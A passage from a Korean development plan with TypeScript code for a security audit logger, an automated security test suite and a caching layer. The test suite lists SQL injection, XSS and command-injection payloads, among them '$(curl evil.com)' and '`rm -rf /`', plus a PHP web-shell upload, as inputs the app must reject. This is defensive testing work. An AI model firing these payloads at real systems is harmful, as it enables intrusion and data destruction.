**구현 내용**:
```typescript
// backend/src/security/audit-logging.ts
import { CloudWatchLogsClient, PutLogEventsCommand } from '@aws-sdk/client-cloudwatch-logs';
import { DynamoDBDocumentClient, PutCommand } from '@aws-sdk/lib-dynamodb';
import crypto from 'crypto';

interface SecurityEvent {
  id: string;
  timestamp: Date;
  eventType: SecurityEventType;
  severity: 'low' | 'medium' | 'high' | 'critical';
  userId?: string;
  ipAddress?: string;
  userAgent?: string;
  resource?: string;
  action?: string;
  result: 'success' | 'failure';
  details?: Record<string, any>;
  stackTrace?: string;
}

enum SecurityEventType {
  // 인증 관련
  LOGIN_ATTEMPT = 'LOGIN_ATTEMPT',
  LOGIN_SUCCESS = 'LOGIN_SUCCESS',
  LOGIN_FAILURE = 'LOGIN_FAILURE',
  LOGOUT = 'LOGOUT',
  PASSWORD_CHANGE = 'PASSWORD_CHANGE',
  PASSWORD_RESET = 'PASSWORD_RESET',
  MFA_ENABLED = 'MFA_ENABLED',
  MFA_DISABLED = 'MFA_DISABLED',
  
  // 권한 관련
  UNAUTHORIZED_ACCESS = 'UNAUTHORIZED_ACCESS',
  PERMISSION_DENIED = 'PERMISSION_DENIED',
  PRIVILEGE_ESCALATION = 'PRIVILEGE_ESCALATION',
  
  // API 키 관련
  API_KEY_CREATED = 'API_KEY_CREATED',
  API_KEY_REVOKED = 'API_KEY_REVOKED',
  API_KEY_ROTATION = 'API_KEY_ROTATION',
  INVALID_API_KEY = 'INVALID_API_KEY',
  
  // 데이터 접근
  SENSITIVE_DATA_ACCESS = 'SENSITIVE_DATA_ACCESS',
  DATA_EXPORT = 'DATA_EXPORT',
  DATA_DELETION = 'DATA_DELETION',
  
  // 보안 위협
  SQL_INJECTION_ATTEMPT = 'SQL_INJECTION_ATTEMPT',
  XSS_ATTEMPT = 'XSS_ATTEMPT',
  RATE_LIMIT_EXCEEDED = 'RATE_LIMIT_EXCEEDED',
  SUSPICIOUS_ACTIVITY = 'SUSPICIOUS_ACTIVITY',
  BRUTE_FORCE_ATTEMPT = 'BRUTE_FORCE_ATTEMPT',
  
  // 시스템 보안
  SECURITY_CONFIGURATION_CHANGE = 'SECURITY_CONFIGURATION_CHANGE',
  CERTIFICATE_EXPIRY_WARNING = 'CERTIFICATE_EXPIRY_WARNING',
  ENCRYPTION_KEY_ROTATION = 'ENCRYPTION_KEY_ROTATION'
}

export class SecurityAuditLogger {
  private cloudWatchClient: CloudWatchLogsClient;
  private dynamoClient: DynamoDBDocumentClient;
  private logGroupName: string;
  private logStreamName: string;
  private tableName: string;
  
  constructor(
    cloudWatchClient: CloudWatchLogsClient,
    dynamoClient: DynamoDBDocumentClient
  ) {
    this.cloudWatchClient = cloudWatchClient;
    this.dynamoClient = dynamoClient;
    this.logGroupName = '/aws/t-developer/security-audit';
    this.logStreamName = `security-${new Date().toISOString().split('T')[0]}`;
    this.tableName = 'T-Developer-SecurityAudit';
  }
  
  async logSecurityEvent(event: Omit<SecurityEvent, 'id' | 'timestamp'>): Promise<void> {
    const securityEvent: SecurityEvent = {
      ...event,
      id: this.generateEventId(),
      timestamp: new Date()
    };
    
    // 병렬로 여러 저장소에 기록
    await Promise.all([
      this.saveToCloudWatch(securityEvent),
      this.saveToDynamoDB(securityEvent),
      this.alertIfCritical(securityEvent)
    ]);
  }
  
  private generateEventId(): string {
    return `sec_${Date.now()}_${crypto.randomBytes(8).toString('hex')}`;
  }
  
  private async saveToCloudWatch(event: SecurityEvent): Promise<void> {
    const logEvent = {
      timestamp: event.timestamp.getTime(),
      message: JSON.stringify({
        ...event,
        timestamp: event.timestamp.toISOString()
      })
    };
    
    try {
      await this.cloudWatchClient.send(new PutLogEventsCommand({
        logGroupName: this.logGroupName,
        logStreamName: this.logStreamName,
        logEvents: [logEvent]
      }));
    } catch (error) {
      console.error('Failed to save security event to CloudWatch:', error);
    }
  }
  
  private async saveToDynamoDB(event: SecurityEvent): Promise<void> {
    const ttl = Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60); // 1년 보관
    
    try {
      await this.dynamoClient.send(new PutCommand({
        TableName: this.tableName,
        Item: {
          ...event,
          timestamp: event.timestamp.toISOString(),
          ttl,
          yearMonth: event.timestamp.toISOString().substring(0, 7), // 파티션 키 최적화
          searchableText: this.createSearchableText(event) // 검색 최적화
        }
      }));
    } catch (error) {
      console.error('Failed to save security event to DynamoDB:', error);
    }
  }
  
  private createSearchableText(event: SecurityEvent): string {
    return [
      event.eventType,
      event.userId,
      event.ipAddress,
      event.resource,
      event.action,
      JSON.stringify(event.details)
    ].filter(Boolean).join(' ').toLowerCase();
  }
  
  private async alertIfCritical(event: SecurityEvent): Promise<void> {
    if (event.severity === 'critical' || this.isCriticalEvent(event.eventType)) {
      // AlertManager를 통해 즉시 알림
      const { alertManager, alertTemplates } = await import('../monitoring/alerting');
      
      await alertManager.sendAlert({
        level: 'critical',
        type: 'security',
        title: `Security Alert: ${event.eventType}`,
        message: `Critical security event detected: ${event.eventType}`,
        metadata: {
          eventId: event.id,
          userId: event.userId,
          ipAddress: event.ipAddress,
          details: event.details
        }
      });
    }
  }
  
  private isCriticalEvent(eventType: SecurityEventType): boolean {
    const criticalEvents = [
      SecurityEventType.PRIVILEGE_ESCALATION,
      SecurityEventType.SQL_INJECTION_ATTEMPT,
      SecurityEventType.BRUTE_FORCE_ATTEMPT,
      SecurityEventType.SENSITIVE_DATA_ACCESS,
      SecurityEventType.DATA_DELETION
    ];
    
    return criticalEvents.includes(eventType);
  }
  
  // 감사 로그 조회 메서드들
  async querySecurityEvents(params: {
    startTime: Date;
    endTime: Date;
    userId?: string;
    eventType?: SecurityEventType;
    severity?: string;
  }): Promise<SecurityEvent[]> {
    // DynamoDB 쿼리 구현
    // 실제 구현은 GSI를 사용하여 효율적인 쿼리 수행
    return [];
  }
  
  async generateComplianceReport(params: {
    startDate: Date;
    endDate: Date;
    reportType: 'SOC2' | 'ISO27001' | 'GDPR' | 'HIPAA';
  }): Promise<Buffer> {
    // 컴플라이언스 보고서 생성 로직
    const events = await this.querySecurityEvents({
      startTime: params.startDate,
      endTime: params.endDate
    });
    
    // PDF 또는 CSV 형식으로 보고서 생성
    return Buffer.from('Compliance Report');
  }
}

// 보안 감사 미들웨어
export function auditMiddleware(auditLogger: SecurityAuditLogger) {
  return async (req: Request, res: Response, next: NextFunction) => {
    const startTime = Date.now();
    
    // 응답 완료 시 감사 로그 기록
    res.on('finish', async () => {
      const duration = Date.now() - startTime;
      
      // 보안 관련 엔드포인트만 로깅
      if (shouldAuditEndpoint(req.path)) {
        await auditLogger.logSecurityEvent({
          eventType: getEventTypeFromEndpoint(req.path, req.method),
          severity: res.statusCode >= 400 ? 'medium' : 'low',
          userId: req.user?.id,
          ipAddress: req.ip,
          userAgent: req.headers['user-agent'],
          resource: req.path,
          action: req.method,
          result: res.statusCode < 400 ? 'success' : 'failure',
          details: {
            statusCode: res.statusCode,
            duration,
            requestId: req.id,
            body: sanitizeForLogging(req.body)
          }
        });
      }
      
      // 보안 위협 감지
      if (isSecurityThreat(req, res)) {
        await auditLogger.logSecurityEvent({
          eventType: detectThreatType(req, res),
          severity: 'high',
          userId: req.user?.id,
          ipAddress: req.ip,
          userAgent: req.headers['user-agent'],
          resource: req.path,
          action: req.method,
          result: 'failure',
          details: {
            threat: analyzeThreat(req, res)
          }
        });
      }
    });
    
    next();
  };
}

// 헬퍼 함수들
function shouldAuditEndpoint(path: string): boolean {
  const auditPaths = [
    '/api/auth',
    '/api/users',
    '/api/admin',
    '/api/billing',
    '/api/security'
  ];
  
  return auditPaths.some(p => path.startsWith(p));
}

function getEventTypeFromEndpoint(path: string, method: string): SecurityEventType {
  // 경로와 메서드 기반으로 이벤트 타입 결정
  if (path.includes('/login') && method === 'POST') {
    return SecurityEventType.LOGIN_ATTEMPT;
  }
  if (path.includes('/logout')) {
    return SecurityEventType.LOGOUT;
  }
  if (path.includes('/api-keys') && method === 'POST') {
    return SecurityEventType.API_KEY_CREATED;
  }
  // 기타 매핑...
  
  return SecurityEventType.SENSITIVE_DATA_ACCESS;
}

function isSecurityThreat(req: Request, res: Response): boolean {
  // 401, 403 반복 시도
  // SQL injection 패턴 감지
  // XSS 시도 감지
  // Rate limit 초과
  return res.statusCode === 403 || res.statusCode === 401;
}

function detectThreatType(req: Request, res: Response): SecurityEventType {
  if (res.statusCode === 429) {
    return SecurityEventType.RATE_LIMIT_EXCEEDED;
  }
  if (res.statusCode === 401) {
    return SecurityEventType.UNAUTHORIZED_ACCESS;
  }
  return SecurityEventType.SUSPICIOUS_ACTIVITY;
}

function analyzeThreat(req: Request, res: Response): any {
  return {
    method: req.method,
    path: req.path,
    statusCode: res.statusCode,
    headers: req.headers,
    query: req.query
  };
}

function sanitizeForLogging(data: any): any {
  // 민감한 정보 제거
  const sanitized = { ...data };
  const sensitiveFields = ['password', 'token', 'apiKey', 'secret'];
  
  sensitiveFields.forEach(field => {
    if (sanitized[field]) {
      sanitized[field] = '[REDACTED]';
    }
  });
  
  return sanitized;
}
```

### SubTask 0.10.5: 보안 테스트 자동화
**목표**: 자동화된 보안 테스트 스위트 구축

**구현 내용**:
```typescript
// backend/tests/security/security-test-suite.ts
import { describe, test, expect, beforeAll, afterAll } from '@jest/globals';
import supertest from 'supertest';
import { OWASP_ZAP_API } from '@zaproxy/nodejs';
import sqlmap from 'sqlmap-api';

// 보안 테스트 헬퍼
class SecurityTestHelper {
  private app: any;
  private zapClient: any;
  
  constructor(app: any) {
    this.app = app;
    this.zapClient = new OWASP_ZAP_API({
      apiKey: process.env.ZAP_API_KEY,
      proxy: 'http://localhost:8080'
    });
  }
  
  // SQL Injection 테스트
  async testSQLInjection(endpoint: string, params: Record<string, string>): Promise<void> {
    const sqlPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users;--",
      "1' UNION SELECT NULL--",
      "' OR 1=1--",
      "admin'--",
      "' OR 'a'='a",
      "'; EXEC xp_cmdshell('dir');--"
    ];
    
    for (const [key, value] of Object.entries(params)) {
      for (const payload of sqlPayloads) {
        const testParams = { ...params, [key]: payload };
        const response = await supertest(this.app)
          .get(endpoint)
          .query(testParams);
        
        // SQL 에러 메시지 노출 확인
        expect(response.text).not.toMatch(/SQL syntax/i);
        expect(response.text).not.toMatch(/mysql_/i);
        expect(response.text).not.toMatch(/ORA-\d+/i);
        expect(response.text).not.toMatch(/PostgreSQL/i);
        
        // 정상적인 에러 응답 확인
        expect(response.status).toBeGreaterThanOrEqual(400);
        expect(response.status).toBeLessThan(500);
      }
    }
  }
  
  // XSS 테스트
  async testXSS(endpoint: string, params: Record<string, string>): Promise<void> {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')">',
      '<input onfocus=alert("XSS") autofocus>',
      '<marquee onstart=alert("XSS")>'
    ];
    
    for (const [key, value] of Object.entries(params)) {
      for (const payload of xssPayloads) {
        const testParams = { ...params, [key]: payload };
        const response = await supertest(this.app)
          .post(endpoint)
          .send(testParams);
        
        // XSS 페이로드가 그대로 반환되지 않는지 확인
        expect(response.text).not.toContain(payload);
        expect(response.text).not.toMatch(/<script/i);
        expect(response.text).not.toMatch(/javascript:/i);
        expect(response.text).not.toMatch(/onerror=/i);
      }
    }
  }
  
  // CSRF 테스트
  async testCSRF(endpoint: string): Promise<void> {
    // CSRF 토큰 없이 요청
    const response = await supertest(this.app)
      .post(endpoint)
      .send({ action: 'delete' });
    
    expect(response.status).toBe(403);
    expect(response.body.error).toMatch(/CSRF/i);
  }
  
  // 인증 우회 테스트
  async testAuthBypass(protectedEndpoints: string[]): Promise<void> {
    for (const endpoint of protectedEndpoints) {
      // 인증 헤더 없이 요청
      const response1 = await supertest(this.app).get(endpoint);
      expect(response1.status).toBe(401);
      
      // 잘못된 토큰으로 요청
      const response2 = await supertest(this.app)
        .get(endpoint)
        .set('Authorization', 'Bearer invalid-token');
      expect(response2.status).toBe(401);
      
      // 만료된 토큰으로 요청
      const expiredToken = this.generateExpiredToken();
      const response3 = await supertest(this.app)
        .get(endpoint)
        .set('Authorization', `Bearer ${expiredToken}`);
      expect(response3.status).toBe(401);
    }
  }
  
  // Rate Limiting 테스트
  async testRateLimiting(endpoint: string, limit: number): Promise<void> {
    const requests = [];
    
    // 제한보다 많은 요청 보내기
    for (let i = 0; i < limit + 5; i++) {
      requests.push(
        supertest(this.app)
          .get(endpoint)
          .set('X-API-Key', 'test-key')
      );
    }
    
    const responses = await Promise.all(requests);
    
    // 제한 초과 응답 확인
    const rateLimitedResponses = responses.filter(r => r.status === 429);
    expect(rateLimitedResponses.length).toBeGreaterThan(0);
    
    // Rate limit 헤더 확인
    const lastResponse = responses[responses.length - 1];
    expect(lastResponse.headers['x-ratelimit-limit']).toBeDefined();
    expect(lastResponse.headers['x-ratelimit-remaining']).toBeDefined();
    expect(lastResponse.headers['x-ratelimit-reset']).toBeDefined();
  }
  
  // 보안 헤더 테스트
  async testSecurityHeaders(endpoint: string): Promise<void> {
    const response = await supertest(this.app).get(endpoint);
    
    // 필수 보안 헤더 확인
    expect(response.headers['x-content-type-options']).toBe('nosniff');
    expect(response.headers['x-frame-options']).toBe('DENY');
    expect(response.headers['x-xss-protection']).toBe('1; mode=block');
    expect(response.headers['strict-transport-security']).toMatch(/max-age=\d+/);
    expect(response.headers['content-security-policy']).toBeDefined();
    
    // 민감한 헤더가 노출되지 않는지 확인
    expect(response.headers['x-powered-by']).toBeUndefined();
    expect(response.headers['server']).not.toMatch(/version/i);
  }
  
  private generateExpiredToken(): string {
    // 만료된 JWT 토큰 생성
    return 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.4Adcj3UFYzPUVaVF43FmMab6RlaQD8A9V8wFzzht-KQ';
  }
}

// 보안 테스트 스위트
describe('Security Test Suite', () => {
  let app: any;
  let securityTester: SecurityTestHelper;
  
  beforeAll(async () => {
    // 테스트 앱 초기화
    app = await createTestApp();
    securityTester = new SecurityTestHelper(app);
  });
  
  afterAll(async () => {
    // 정리
    await cleanupTestApp();
  });
  
  describe('Injection Attacks', () => {
    test('should prevent SQL injection attacks', async () => {
      await securityTester.testSQLInjection('/api/projects', {
        search: 'test',
        sort: 'name'
      });
    });
    
    test('should prevent NoSQL injection attacks', async () => {
      const payload = { '$ne': null };
      const response = await supertest(app)
        .post('/api/projects/search')
        .send({ filter: payload });
      
      expect(response.status).toBe(400);
    });
    
    test('should prevent command injection', async () => {
      const payloads = [
        '; ls -la',
        '| whoami',
        '`rm -rf /`',
        '$(curl evil.com)'
      ];
      
      for (const payload of payloads) {
        const response = await supertest(app)
          .post('/api/execute')
          .send({ command: payload });
        
        expect(response.status).toBe(400);
      }
    });
  });
  
  describe('XSS Prevention', () => {
    test('should prevent reflected XSS', async () => {
      await securityTester.testXSS('/api/projects', {
        name: 'Test Project',
        description: 'Test Description'
      });
    });
    
    test('should prevent stored XSS', async () => {
      const xssPayload = '<script>alert("XSS")</script>';
      
      // 저장 시도
      const createResponse = await supertest(app)
        .post('/api/projects')
        .send({
          name: xssPayload,
          description: xssPayload
        });
      
      if (createResponse.status === 201) {
        // 조회하여 XSS 페이로드가 실행되지 않는지 확인
        const getResponse = await supertest(app)
          .get(`/api/projects/${createResponse.body.id}`);
        
        expect(getResponse.text).not.toContain('<script>');
        expect(getResponse.headers['content-type']).toMatch(/json/);
      }
    });
  });
  
  describe('Authentication & Authorization', () => {
    test('should prevent authentication bypass', async () => {
      const protectedEndpoints = [
        '/api/admin/users',
        '/api/billing/invoices',
        '/api/projects/private'
      ];
      
      await securityTester.testAuthBypass(protectedEndpoints);
    });
    
    test('should prevent privilege escalation', async () => {
      const userToken = await getTestUserToken('user');
      
      // 일반 사용자가 관리자 엔드포인트 접근 시도
      const response = await supertest(app)
        .get('/api/admin/settings')
        .set('Authorization', `Bearer ${userToken}`);
      
      expect(response.status).toBe(403);
    });
    
    test('should prevent JWT token manipulation', async () => {
      const validToken = await getTestUserToken('user');
      
      // 토큰 페이로드 변조
      const parts = validToken.split('.');
      const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
      payload.role = 'admin';
      parts[1] = Buffer.from(JSON.stringify(payload)).toString('base64');
      const manipulatedToken = parts.join('.');
      
      const response = await supertest(app)
        .get('/api/admin/users')
        .set('Authorization', `Bearer ${manipulatedToken}`);
      
      expect(response.status).toBe(401);
    });
  });
  
  describe('API Security', () => {
    test('should enforce rate limiting', async () => {
      await securityTester.testRateLimiting('/api/public/search', 100);
    });
    
    test('should validate API key format', async () => {
      const invalidKeys = [
        'invalid-key',
        'sk_',
        'sk_short',
        'not_starting_with_sk_validlength1234567890'
      ];
      
      for (const key of invalidKeys) {
        const response = await supertest(app)
          .get('/api/projects')
          .set('X-API-Key', key);
        
        expect(response.status).toBe(401);
        expect(response.body.code).toBe('INVALID_API_KEY_FORMAT');
      }
    });
    
    test('should enforce CORS policy', async () => {
      const response = await supertest(app)
        .options('/api/projects')
        .set('Origin', 'https://evil.com');
      
      expect(response.headers['access-control-allow-origin']).not.toBe('https://evil.com');
    });
  });
  
  describe('Security Headers', () => {
    test('should set all required security headers', async () => {
      await securityTester.testSecurityHeaders('/api/health');
    });
    
    test('should not expose sensitive information in errors', async () => {
      const response = await supertest(app)
        .get('/api/this-endpoint-does-not-exist');
      
      expect(response.status).toBe(404);
      expect(response.body).not.toHaveProperty('stack');
      expect(response.body).not.toHaveProperty('sql');
      expect(response.body).not.toHaveProperty('database');
    });
  });
  
  describe('Data Protection', () => {
    test('should mask sensitive data in responses', async () => {
      const response = await supertest(app)
        .get('/api/users/profile')
        .set('Authorization', `Bearer ${await getTestUserToken('user')}`);
      
      if (response.status === 200) {
        // 이메일이 마스킹되어 있는지 확인
        expect(response.body.email).toMatch(/^.+\*+.+@.+$/);
        
        // 전화번호가 마스킹되어 있는지 확인
        if (response.body.phone) {
          expect(response.body.phone).toMatch(/\*+\d{4}$/);
        }
      }
    });
    
    test('should encrypt sensitive fields in database', async () => {
      // 이 테스트는 실제 DB 레코드를 확인해야 함
      // 구현은 테스트 환경에 따라 다름
    });
  });
  
  describe('File Upload Security', () => {
    test('should validate file types', async () => {
      const maliciousFile = Buffer.from('<?php system($_GET["cmd"]); ?>');
      
      const response = await supertest(app)
        .post('/api/upload')
        .attach('file', maliciousFile, 'shell.php')
        .set('Authorization', `Bearer ${await getTestUserToken('user')}`);
      
      expect(response.status).toBe(400);
      expect(response.body.error).toMatch(/Invalid file type/i);
    });
    
    test('should enforce file size limits', async () => {
      const largeFile = Buffer.alloc(11 * 1024 * 1024); // 11MB
      
      const response = await supertest(app)
        .post('/api/upload')
        .attach('file', largeFile, 'large.jpg')
        .set('Authorization', `Bearer ${await getTestUserToken('user')}`);
      
      expect(response.status).toBe(400);
      expect(response.body.error).toMatch(/File too large/i);
    });
  });
});

// 자동화된 보안 스캔 실행 스크립트
export async function runSecurityScan(targetUrl: string): Promise<void> {
  console.log('🔒 Starting automated security scan...');
  
  // OWASP ZAP 스캔
  const zap = new OWASP_ZAP_API({
    apiKey: process.env.ZAP_API_KEY,
    proxy: 'http://localhost:8080'
  });
  
  // 스파이더 실행
  await zap.spider.scan(targetUrl);
  await waitForSpiderComplete(zap);
  
  // 액티브 스캔 실행
  await zap.ascan.scan(targetUrl);
  await waitForScanComplete(zap);
  
  // 결과 가져오기
  const alerts = await zap.core.alerts(targetUrl);
  
  // 보고서 생성
  const report = generateSecurityReport(alerts);
  await saveSecurityReport(report);
  
  console.log('✅ Security scan completed!');
}

// 헬퍼 함수들
async function getTestUserToken(role: string): Promise<string> {
  // 테스트용 JWT 토큰 생성
  return 'test-token';
}

async function createTestApp(): Promise<any> {
  // 테스트 앱 생성
  return {};
}

async function cleanupTestApp(): Promise<void> {
  // 테스트 정리
}

function generateSecurityReport(alerts: any[]): any {
  // 보안 보고서 생성
  return {
    summary: {
      high: alerts.filter(a => a.risk === 'High').length,
      medium: alerts.filter(a => a.risk === 'Medium').length,
      low: alerts.filter(a => a.risk === 'Low').length
    },
    alerts
  };
}

async function saveSecurityReport(report: any): Promise<void> {
  // 보고서 저장
}

async function waitForSpiderComplete(zap: any): Promise<void> {
  // 스파이더 완료 대기
}

async function waitForScanComplete(zap: any): Promise<void> {
  // 스캔 완료 대기
}
```

**🔧 사용자 작업**:
- 보안 관련 환경 변수 설정 (KMS 키 ID 등)
- API 키 생성 및 관리 정책 수립
- 보안 감사 로그 보관 정책 설정
- 정기적인 보안 테스트 실행 스케줄 설정

---

## Task 0.11: 성능 최적화 기초 설정

### SubTask 0.11.1: 캐싱 전략 구현
**목표**: 다계층 캐싱 시스템 구축

**구현 내용**:
```typescript
// backend/src/performance/caching.ts
import Redis from 'ioredis';
import { LRUCache } from 'lru-cache';
import crypto from 'crypto';
import { logger } from '../config/logger';

// 캐시 키 네임스페이스
enum CacheNamespace {
  PROJECT = 'project',
  USER = 'user',
  COMPONENT = 'component',
  AGENT_RESULT = 'agent_result',
  API_RESPONSE = 'api_response',
  SESSION = 'session'
}

// 캐시 TTL 설정 (초)
const CacheTTL = {
  [CacheNamespace.PROJECT]: 3600,        // 1시간
  [CacheNamespace.USER]: 1800,           // 30분
  [CacheNamespace.COMPONENT]: 86400,     // 24시간
  [CacheNamespace.AGENT_RESULT]: 7200,   // 2시간
  [CacheNamespace.API_RESPONSE]: 300,    // 5분
  [CacheNamespace.SESSION]: 3600         // 1시간
};

export class CacheManager {
  private redis: Redis;
  private memoryCache: LRUCache<string, any>;
  private stats = {
    hits: 0,
    misses: 0,
    errors: 0
  };
  
  constructor() {
    // Redis 연결
    this.redis = new Redis({
      host: process.env.REDIS_HOST || 'localhost',
      port: parseInt(process.env.REDIS_PORT || '6379'),
      password: process.env.REDIS_PASSWORD,
      db: parseInt(process.env.REDIS_DB || '0'),
      retryStrategy: (times) => {
        const delay = Math.min(times * 50, 2000);
        return delay;
      },
      enableOfflineQueue: true
    });
    
    // 인메모리 캐시 (L1 캐시)
    this.memoryCache = new LRUCache({
      max: 1000,
      ttl: 60000, // 1분
      updateAgeOnGet: true,
      updateAgeOnHas: true
    });
    
    // Redis 이벤트 핸들러
    this.redis.on('error', (err) => {
      logger.error('Redis connection error:', err);
    });
    
    this.redis.on('connect', () => {
      logger.info('Redis connected successfully');
    });
  }
  
  // 캐시 키 생성
  private generateKey(namespace: CacheNamespace, identifier: string, params?: any): string {
    if (!params) {
      return `${namespace}:${identifier}`;
    }
    
    // 파라미터 해시화
    const paramHash = crypto
      .createHash('md5')
      .update(JSON.stringify(params))
      .digest('hex');
    
    return `${namespace}:${identifier}:${paramHash}`;
  }
  
  // 캐시 가져오기 (L1 -> L2)
  async get<T>(
    namespace: CacheNamespace,
    identifier: string,
    params?: any
  ): Promise<T | null> {
    const key = this.generateKey(namespace, identifier, params);
    
    try {
      // L1 캐시 확인
      const memoryValue = this.memoryCache.get(key);
      if (memoryValue !== undefined) {
        this.stats.hits++;
        logger.debug(`Cache hit (L1): ${key}`);
        return memoryValue;
      }
      
      // L2 캐시 (Redis) 확인
      const redisValue = await this.redis.get(key);
      if (redisValue) {
        this.stats.hits++;
        logger.debug(`Cache hit (L2): ${key}`);
        
        const parsed = JSON.parse(redisValue);
        
        // L1 캐시에 저장
        this.memoryCache.set(key, parsed);
        
        return parsed;
      }
      
      this.stats.misses++;
      logger.debug(`Cache miss: ${key}`);
      return null;
      
    } catch (error) {
      this.stats.errors++;
      logger.error(`Cache get error for ${key}:`, error);
      return null;
    }
  }
  
  // 캐시 저장
  async set<T>(
    namespace: CacheNamespace,
    identifier: string,
    value: T,
    params?: any,
    ttl?: number
  ): Promise<void> {
    const key = this.generateKey(namespace, identifier, params);
    const finalTTL = ttl || CacheTTL[namespace] || 3600;
    
    try {
      const serialized = JSON.stringify(value);
      
      // L2 캐시 (Redis) 저장
      await this.redis.setex(key, finalTTL, serialized);
      
      // L1 캐시 (Memory) 저장
      this.memoryCache.set(key, value);
      
      logger.debug(`Cache set: ${key} (TTL: ${finalTTL}s)`);
      
    } catch (error) {
      this.stats.errors++;
      logger.error(`Cache set error for ${key}:`, error);
    }
  }
  
  // 캐시 무효화
  async invalidate(namespace: CacheNamespace, identifier: string, params?: any): Promise<void> {
    const key = this.generateKey(namespace, identifier, params);
    
    try {
      // L1 캐시 삭제
      this.memoryCache.delete(key);
      
      // L2 캐시 삭제
      await this.redis.del(key);
      
      logger.debug(`Cache invalidated: ${key}`);
      
    } catch (error) {
      logger.error(`Cache invalidation error for ${key}:`, error);
    }
  }
  
  // 패턴 기반 캐시 무효화
  async invalidatePattern(pattern: string): Promise<void> {
    try {
      // L1 캐시에서 패턴 매칭 삭제
      for (const key of this.memoryCache.keys()) {
        if (key.match(pattern)) {
          this.memoryCache.delete(key);
        }
      }
      
      // L2 캐시에서 패턴 매칭 삭제
      const keys = await this.redis.keys(pattern);
      if (keys.length > 0) {
        await this.redis.del(...keys);
        logger.debug(`Cache invalidated ${keys.length} keys matching pattern: ${pattern}`);
      }
      
    } catch (error) {
      logger.error(`Pattern cache invalidation error:`, error);
    }
  }
  
  // 캐시 통계
  getStats() {
    const hitRate = this.stats.hits / (this.stats.hits + this.stats.misses) || 0;
    
    return {
      ...this.stats,
      hitRate: (hitRate * 100).toFixed(2) + '%',
      memoryCacheSize: this.memoryCache.size,
      memoryCacheCapacity: this.memoryCache.max
    };
  }
  
  // 캐시 예열 (Cache Warming)
  async warmCache(namespace: CacheNamespace, items: Array<{ identifier: string; value: any; params?: any }>): Promise<void> {
    logger.info(`Warming cache for namespace: ${namespace}`);
    
    const promises = items.map(item =>
      this.set(namespace, item.identifier, item.value, item.params)
    );
    
    await Promise.all(promises);
    
    logger.info(`Cache warmed with ${items.length} items`);
  }
  
  // 캐시 태그 시스템
  async setWithTags<T>(
    namespace: CacheNamespace,
    identifier: string,
    value: T,
    tags: string[],
    params?: any,
    ttl?: number
  ): Promise<void> {
    await this.set(namespace, identifier, value, params, ttl);
    
    // 태그별로 키 저장
    const key = this.generateKey(namespace, identifier, params);
    for (const tag of tags) {
      await this.redis.sadd(`tag:${tag}`, key);
      await this.redis.expire(`tag:${tag}`, 86400); // 24시간
    }
  }
  
  // 태그 기반 캐시 무효화
  async invalidateByTag(tag: string): Promise<void> {
    const keys = await this.redis.smembers(`tag:${tag}`);
    
    if (keys.length > 0) {
      // 모든 관련 키 삭제
      await Promise.all(keys.map(key => {
        this.memoryCache.delete(key);
        return this.redis.del(key);
      }));
      
      // 태그 삭제
      await this.redis.del(`tag:${tag}`);
      
      logger.debug(`Invalidated ${keys.length} cache entries with tag: ${tag}`);
    }
  }
}

// 캐싱 데코레이터
export function Cacheable(namespace: CacheNamespace, ttl?: number) {
  return function (target: any, propertyName: string, descriptor: PropertyDescriptor) {
    const originalMethod = descriptor.value;
    
    descriptor.value = async function (...args: any[]) {
      const cacheManager = (this as any).cacheManager || new CacheManager();
      
      // 캐시 키 생성을 위한 식별자
      const identifier = `${target.constructor.name}.${propertyName}`;
      const params = args.length > 0 ? args : undefined;
      
      // 캐시 확인
      const cached = await cacheManager.get(namespace, identifier, params);
      if (cached !== null) {
        return cached;
      }
      
      // 원본 메서드 실행
      const result = await originalMethod.apply(this, args);
      
      // 결과 캐싱
      await cacheManager.set(namespace, identifier, result, params, ttl);
      
      return result;
    };
    
    return descriptor;
  };
}

// HTTP 응답 캐싱 미들웨어
export function httpCacheMiddleware(options: {
  namespace?: CacheNamespace;
  ttl?: number;
  keyGenerator?: (req: Request) => string;
}) {
  const cacheManager = new CacheManager();
  const {
    namespace = CacheNamespace.API_RESPONSE,
    ttl = 300,
    keyGenerator = (req) => `${req.method}:${req.path}:${JSON.stringify(req.query)}`
  } = options;
  
  return async (req: Request, res: Response, next: NextFunction) => {
    // POST, PUT, DELETE 요청은 캐싱하지 않음
    if (req.method !== 'GET') {
      return next();
    }
    
    const cacheKey = keyGenerator(req);
    
    // 캐시 확인
    const cached = await cacheManager.get(namespace, cacheKey);
    if (cached) {
      res.setHeader('X-Cache', 'HIT');
      res.setHeader('X-Cache-TTL', ttl.toString());
      return res.json(cached);
    }
    
    // 원본 응답 캐싱
    const originalJson = res.json;
    res.json = function (data: any) {
      res.setHeader('X-Cache', 'MISS');
      
      // 성공 응답만 캐싱
      if (res.statusCode >= 200 && res.statusCode < 300) {
        cacheManager.set(namespace, cacheKey, data, undefined, ttl)
          .catch(err => logger.error('Failed to cache response:', err));
      }
      
      return originalJson.call(this, data);
    };
    
    next();
  };
}

// 캐시 관리 API 엔드포인트
export function setupCacheManagementEndpoints(app: Express, cacheManager: CacheManager): void {
  // 캐시 통계
  app.get('/api/admin/cache/stats', (req, res) => {
    res.json(cacheManager.getStats());
  });
  
  // 캐시 무효화
  app.delete('/api/admin/cache/invalidate', async (req, res) => {
    const { namespace, identifier, pattern } = req.body;
    
    try {
      if (pattern) {
        await cacheManager.invalidatePattern(pattern);
      } else if (namespace && identifier) {
        await cacheManager.invalidate(namespace as CacheNamespace, identifier);
      } else {
        return res.status(400).json({ error: 'Invalid parameters' });
      }
      
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: 'Cache invalidation failed' });
    }
  });
  
  // 캐시 예열
  app.post('/api/admin/cache/warm', async (req, res) => {
    const { namespace, items } = req.body;
    
    try {
      await cacheManager.warmCache(namespace as CacheNamespace, items);
      res.json({ success: true, count: items.length });
    } catch (error) {
      res.status(500).json({ error: 'Cache warming failed' });
    }
  });
}
```
---

